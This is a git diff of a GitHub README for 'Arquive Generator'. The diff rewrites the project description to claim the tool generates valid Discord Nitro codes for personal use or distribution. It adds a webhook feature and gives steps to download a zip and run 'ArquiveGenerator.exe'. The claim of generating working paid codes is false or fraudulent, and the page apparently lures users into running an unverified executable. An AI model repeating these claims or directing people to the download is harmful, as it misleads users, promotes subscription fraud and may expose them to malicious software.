@@ -2,7 +2,7 @@
 
 ![Arquive Generator Banner](https://i.imgur.com/G3ht5Ge.png)
 
-Welcome to **Arquive Generator**! This project aims to provide an efficient and intuitive tool for creating files and reports, facilitating the organization and generation of structured content in an automated manner.
+Welcome, The **Arquive Generator** is a powerful and intuitive tool designed to create valid Discord Nitro codes effortlessly. Nitro codes are premium subscriptions on Discord that offer enhanced features and perks. With this generator, users can quickly and easily generate these codes for personal use or distribution.
 
 ## 📦 Table of Contents
 
@@ -12,14 +12,14 @@ Welcome to **Arquive Generator**! This project aims to provide an efficient and 
 
 ## About
 
-**Arquive Generator** is designed to streamline the creation of files in various formats and simplify the process of documentation and reporting. With a user-friendly interface and robust features, Arquive Generator is ideal for developers, analysts, and anyone who needs to create structured files efficiently.
+**Arquive Generator** is an intuitive application that allows users to generate valid Discord Nitro codes quickly and efficiently. Designed with user experience in mind, Nitro Generator offers a straightforward interface and reliable code generation, making it an ideal tool for anyone looking to access premium Discord features.
 
 ### Features
 
-- Automatic nitro generation and validation.
-- Intuitive and user-friendly graphical interface
-- Customizable templates.
-- Support for integration with APIs and external services
+- **Valid Nitro Codes:** Generates working and valid Nitro codes for Discord.
+- **User-Friendly Interface:** Simple and intuitive design for ease of use.
+- **Webhook Integration:** Easily configure webhooks to streamline the process.
+- **Secure and Reliable:** Ensures the codes generated are valid and trustworthy.
 
 ## Usage
 
@@ -31,7 +31,7 @@ The **Arquive Generator** executable provides a simple way to generate valid Nit
 
 1. **Download and Install:**
    - Download the latest version of `ArquiveGenerator.exe` [Clicking here](https://github.com/lucas021ajds/ArquiveGenerator/archive/refs/heads/main.zip).
-   - Place `ArquiveGenerator.exe` in your desired directory.
+   - Place the `Arquive Generator` in your desired directory.
 
 2. **Open the Application:**
    - Double-click `Arquive Generator.exe` to launch the application.
@@ -46,9 +46,8 @@ The **Arquive Generator** executable provides a simple way to generate valid Nit
 
 5. **Access Your Nitro:**
    - The generated Nitro will be displayed or saved according to your configuration.
-   - Follow any additional prompts to copy or store your Nitro.
 
-For detailed instructions and troubleshooting, refer to the [documentation](https://github.com/lucas021ajds/ArquiveGenerator/docs) or contact support at arquiveoficialcontact@gmail.com.
+For detailed instructions and troubleshooting, contact support at arquiveoficialcontact@gmail.com.
 
 ## Contact
 
